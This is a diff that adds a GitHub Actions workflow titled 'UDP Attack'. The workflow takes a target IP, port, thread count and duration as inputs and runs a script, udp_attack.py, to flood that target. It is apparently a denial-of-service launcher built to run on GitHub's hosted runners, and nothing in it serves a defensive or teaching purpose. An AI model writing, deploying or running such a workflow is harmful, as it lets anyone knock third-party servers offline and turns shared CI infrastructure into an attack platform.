@@ -1,0 +1,41 @@
+name: UDP Attack
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: "Target IP address"
+        required: true
+      port:
+        description: "Target port"
+        required: true
+      threads:
+        description: "Number of threads (default: 10)"
+        required: false
+      duration:
+        description: "Duration of the attack in seconds (default: 60)"
+        required: false
+
+jobs:
+  attack-server:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+
+    - name: Run UDP attack script
+      run: |
+        python3 udp_attack.py ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} --threads ${{ github.event.inputs.threads || '10' }} --duration ${{ github.event.inputs.duration || '60' }}
